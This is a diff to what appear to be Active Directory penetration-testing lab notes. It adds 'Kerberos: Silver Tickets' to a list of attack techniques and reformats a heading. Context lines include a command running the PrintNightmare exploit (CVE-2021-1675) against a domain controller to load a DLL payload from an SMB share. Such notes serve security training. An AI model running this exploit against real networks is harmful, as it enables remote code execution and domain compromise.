@@ -361,16 +361,13 @@ Executes the exploit and specifies the location of the DLL payload
     sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'
 
 
-## Shadow Credentials
-
-
-
+Shadow Credentials
 Pass the hash attacks
 Active Directory Certificate Services (AD CS) attacks
 Kerberos Constrained Delegation
 Kerberos Unconstrained Delegation
 Kerberos Resource-Based Constrained Delegation (RBCD)
-
+Kerberos: Silver Tickets
 
 
 WriteOwner abused with Set-DomainObjectOwner
